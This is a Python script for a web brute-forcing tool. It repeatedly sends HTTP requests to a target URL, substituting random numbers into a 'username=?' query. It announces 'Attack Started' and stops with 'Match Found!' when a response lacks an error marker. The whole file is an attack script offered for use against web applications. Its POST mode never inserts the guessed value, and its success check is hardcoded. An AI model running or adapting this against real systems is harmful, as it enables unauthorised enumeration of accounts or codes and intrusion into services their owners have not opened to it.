from bruter.sources.random_nums import RandomNumbersSource
from time import sleep, time, strftime, localtime
from termcolor import colored
from sys import stdout
from utils.args import args, fpatt, spatt, url, data, delay, http

print ('\n\t--<( Attack Started on: %s )>--\n' % colored(strftime("%H:%M:%S"), 'yellow', attrs=['bold']))
print (colored(' * ', 'green') + 'Url: %s' % colored(url, 'cyan', attrs=['bold']))
print (colored(' * ', 'green') + 'Query: %s' % colored('username=?', 'cyan', attrs=['bold']))
print (colored(' * ', 'green') + 'Attack Method: %s' % colored('Bruteforce (Random Numbers)', 'cyan', attrs=['bold']))

print ('')

src = RandomNumbersSource(args.length)
start_time = time()
tries = 0

while True:
    v = args.prefix + str(src.Next()) + args.suffix
    tries += 1

    stdout.write('\r\t Current Entry [ %s ] Try #%s, %s Elapsed' % (colored(str(v), 'cyan', attrs=['bold']), colored(tries, 'yellow'), colored('%ds' % (time() - start_time), 'yellow')))
    stdout.flush()

    ret = ''
    if args.post:
        ret = http.make_request(url, data=data)
    else:
        ret = http.make_request(url + '?' + data.replace('?', str(v)))

    if 'var error' not in ret: #not fpatt.match(ret) or spatt.match(ret):
        print ('\n\n\t   ' + '-' * 40)
        print ('\n\t\t   --<( %s )>--' % colored('Match Found!', 'green', attrs=['bold']))
        print ('\n\t\t     * Value: %s' % colored(' ' + str(v) + ' ', 'cyan', attrs=['bold', 'reverse']))
        print ('\t\t     * Total Tries: %s\n' % colored(str(tries), 'yellow', attrs=['bold']))
        break

    sleep(delay / 1000)

